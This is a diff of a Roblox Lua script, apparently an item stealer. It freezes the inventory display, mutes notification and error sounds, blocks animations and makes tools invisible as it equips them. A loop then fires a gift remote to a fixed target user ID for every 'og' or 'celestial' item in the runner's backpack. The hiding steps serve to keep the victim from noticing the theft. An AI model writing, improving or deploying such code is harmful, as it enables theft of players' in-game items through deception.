@@ -135,12 +135,12 @@ end)
 repeat task.wait() until isGoodServer
 
 --====================================================
--- 🔥 FREEZE BACKPACK (METHOD 1–5)
+-- 🔥 FREEZE BACKPACK (SAFE VERSION)
 --====================================================
 
 local inv = player.PlayerGui:WaitForChild("NewInventory")
 
--- METHOD 1: Kill Tween
+-- Method 1
 for _,v in ipairs(inv:GetDescendants()) do
     if v:IsA("GuiObject") then
         pcall(function()
@@ -150,7 +150,7 @@ for _,v in ipairs(inv:GetDescendants()) do
     end
 end
 
--- METHOD 2: Lock Size/Position
+-- Method 2
 for _,v in ipairs(inv:GetDescendants()) do
     if v:IsA("GuiObject") then
         local size = v.Size
@@ -166,7 +166,7 @@ for _,v in ipairs(inv:GetDescendants()) do
     end
 end
 
--- METHOD 3: Remove UI Effects
+-- Method 3
 for _,v in ipairs(inv:GetDescendants()) do
     if v:IsA("UIScale")
     or v:IsA("UIGradient")
@@ -175,28 +175,17 @@ for _,v in ipairs(inv:GetDescendants()) do
     end
 end
 
--- METHOD 4: Disable UI Scripts
-for _,v in ipairs(inv:GetDescendants()) do
-    if v:IsA("LocalScript") then
-        v.Disabled = true
-    end
-end
-
--- METHOD 5: Anti Respawn
+-- Method 5
 inv.DescendantAdded:Connect(function(obj)
     if obj:IsA("UIScale")
     or obj:IsA("UIGradient")
     or obj:IsA("UIStroke") then
         obj:Destroy()
     end
-
-    if obj:IsA("LocalScript") then
-        obj.Disabled = true
-    end
 end)
 
 --====================================================
--- SOUND KILL
+-- 🔇 SOUND KILL
 --====================================================
 
 local function killTargetSounds()
@@ -205,7 +194,7 @@ local function killTargetSounds()
 
     for _,name in ipairs({"Notification","ErrorSound"}) do
         local s = effects:FindFirstChild(name)
-        if s and s:IsA("Sound") then
+        if s then
             s.Volume = 0
             s:Stop()
         end
@@ -222,7 +211,132 @@ SoundService.DescendantAdded:Connect(function(obj)
 end)
 
 --====================================================
--- (SISA SCRIPT KAMU TETAP SAMA)
--- silentEquip, disableEntityGui, breakToolJoints, auto gift, dll
--- TIDAK DIUBAH SAMA SEKALI
+-- 🎬 ANTI ANIM
 --====================================================
+
+local function getChar()
+    return player.Character or player.CharacterAdded:Wait()
+end
+
+local function blockAnim(hum)
+    if animBlocked then return end
+    animBlocked = true
+
+    hum.AnimationPlayed:Connect(function(track)
+        track:Stop()
+    end)
+end
+
+--====================================================
+-- 🔧 TOOL VISUAL CLEAN
+--====================================================
+
+local function disableEntityGui(tool)
+    for _,v in ipairs(tool:GetDescendants()) do
+        if v:IsA("BillboardGui") or v.Name == "EntityGUI" then
+            v.Enabled = false
+        end
+    end
+end
+
+local function breakToolJoints(tool)
+    for _,v in ipairs(tool:GetDescendants()) do
+        if v:IsA("Weld")
+        or v:IsA("Motor6D")
+        or v:IsA("WeldConstraint") then
+            v:Destroy()
+        end
+    end
+end
+
+local function silentEquip(tool)
+    local char = getChar()
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if not hum then return end
+
+    blockAnim(hum)
+
+    disableEntityGui(tool)
+
+    for _,v in ipairs(tool:GetDescendants()) do
+        if v:IsA("BasePart") then
+            v.LocalTransparencyModifier = 1
+            v.Transparency = 1
+            v.CanCollide = false
+            v.Massless = true
+        end
+    end
+
+    hum:EquipTool(tool)
+
+    task.defer(function()
+        breakToolJoints(tool)
+    end)
+
+    tool.DescendantAdded:Connect(function(obj)
+        if obj:IsA("BillboardGui") or obj.Name == "EntityGUI" then
+            obj.Enabled = false
+        end
+
+        if obj:IsA("Weld")
+        or obj:IsA("Motor6D")
+        or obj:IsA("WeldConstraint") then
+            obj:Destroy()
+        end
+    end)
+end
+
+local function unequipAll()
+    local char = getChar()
+    for _,v in ipairs(char:GetChildren()) do
+        if v:IsA("Tool") then
+            v.Parent = backpack
+        end
+    end
+end
+
+--====================================================
+-- 🎯 RARITY
+--====================================================
+
+local function getRarity(tool)
+    local model = tool:FindFirstChild(tool.Name)
+
+    if model
+    and model:FindFirstChild("Root")
+    and model.Root:FindFirstChild("EntityGUI")
+    and model.Root.EntityGUI:FindFirstChild("Frame")
+    and model.Root.EntityGUI.Frame:FindFirstChild("RarityLabel") then
+        return string.lower(model.Root.EntityGUI.Frame.RarityLabel.Text)
+    end
+end
+
+local function isWeightTool(tool)
+    return weightFolder:FindFirstChild(tool.Name) ~= nil
+end
+
+--====================================================
+-- 🎁 AUTO GIFT LOOP
+--====================================================
+
+task.spawn(function()
+    while true do
+        task.wait(0.01)
+
+        for _,tool in ipairs(backpack:GetChildren()) do
+            if tool:IsA("Tool") and not isWeightTool(tool) then
+
+                silentEquip(tool)
+                task.wait(0.02)
+
+                local rarity = getRarity(tool)
+
+                if rarity == "og" or rarity == "celestial" then
+                    giftRemote:FireServer(targetUserId)
+                end
+
+                unequipAll()
+            end
+        end
+    end
+end)
